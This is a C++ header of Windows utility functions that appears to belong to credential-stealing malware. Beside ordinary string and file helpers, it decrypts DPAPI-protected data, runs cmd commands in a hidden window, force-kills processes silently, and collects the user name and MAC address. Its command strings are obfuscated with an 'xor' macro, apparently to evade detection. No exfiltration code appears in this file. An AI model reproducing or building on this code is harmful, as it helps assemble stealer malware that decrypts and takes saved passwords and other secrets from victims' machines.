#pragma once


#include "config.hpp"
#include <shellapi.h>
#include <wincrypt.h>
#include <Lmcons.h>


inline std::wstring s2ws(const std::string& str) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), NULL, 0);
    std::wstring wstr(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), &wstr[0], size_needed);
    return wstr;
}

inline std::string ws2s(const std::wstring& wstr) {
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &str[0], size_needed, NULL, NULL);
    return str;
}


template <typename T>
inline T read_registry_key(HKEY hkey, const std::string& sub_key, const std::string& value_name) {
    T data{};
    HKEY opened_key;
    DWORD size = 0;
    if (RegOpenKeyExA(hkey, sub_key.c_str(), 0, KEY_READ, &opened_key) == ERROR_SUCCESS) {
        RegQueryValueExA(opened_key, value_name.c_str(), NULL, NULL, NULL, &size);
        std::vector<char> buffer(size);
        RegQueryValueExA(opened_key, value_name.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(buffer.data()), &size);
        if constexpr (std::is_same_v<T, std::string>) {
            data = std::string(buffer.data(), buffer.size());
        } else {
            if (buffer.size() >= sizeof(T))
                data = *reinterpret_cast<T*>(buffer.data());
        }
        RegCloseKey(opened_key);
    }
    return data;
}


inline int crypt_unprotect_data(const std::string& data, std::string& output) {
    DATA_BLOB in = {(DWORD)data.size(), (BYTE*)data.data()};
    DATA_BLOB out;
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out))
        return GetLastError();
    output.assign((char*)out.pbData, out.cbData);
    LocalFree(out.pbData);
    return 0;
}


template <typename... Args>
std::string va(const std::string& fmt, Args... args) {
    size_t size = snprintf(nullptr, 0, fmt.c_str(), args...) + 1;
    std::unique_ptr<char[]> buf(new char[size]);
    snprintf(buf.get(), size, fmt.c_str(), args...);
    return std::string(buf.get(), buf.get() + size - 1);
}


inline int read_binary_file(const std::filesystem::path& file, std::string& output) {
    HANDLE hFile = CreateFileW(file.wstring().c_str(), GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return GetLastError();

    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); return GetLastError(); }

    output.resize(size);
    DWORD read;
    if (!ReadFile(hFile, &output[0], size, &read, NULL) || read != size) {
        CloseHandle(hFile); return GetLastError();
    }
    CloseHandle(hFile);
    return 0;
}


inline void hidden_system(const char* cmd) {
    ShellExecuteA(nullptr, xor("open"), xor("cmd"),
                  va(xor("/c %s"), cmd).c_str(), nullptr, SW_HIDE);
}


inline std::string bytes_to_hex(const uint8_t* data, size_t len) {
    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (size_t i = 0; i < len; ++i)
        ss << std::setw(2) << static_cast<int>(data[i]);
    return ss.str();
}


inline DWORD find_process_id(const std::wstring& process_name) {
    PROCESSENTRY32W pe = {sizeof(pe)};
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;
    if (Process32FirstW(snapshot, &pe)) {
        do {
            if (process_name == pe.szExeFile) {
                CloseHandle(snapshot);
                return pe.th32ProcessID;
            }
        } while (Process32NextW(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return 0;
}

inline void kill_process(const char* exe_name) {
    hidden_system(va(xor("taskkill /f /im %s >nul 2>&1"), exe_name).c_str());
}


inline std::string get_username() {
    char username[UNLEN + 1];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size))
        return std::string(username);
    return "unknown";
}


inline std::string format_mac_address(BYTE* address, DWORD length) {
    std::string mac;
    for (DWORD i = 0; i < length; ++i) {
        char hex[4];
        snprintf(hex, sizeof(hex), "%02X", address[i]);
        mac += hex;
        if (i < length - 1) mac += ':';
    }
    return mac;
}
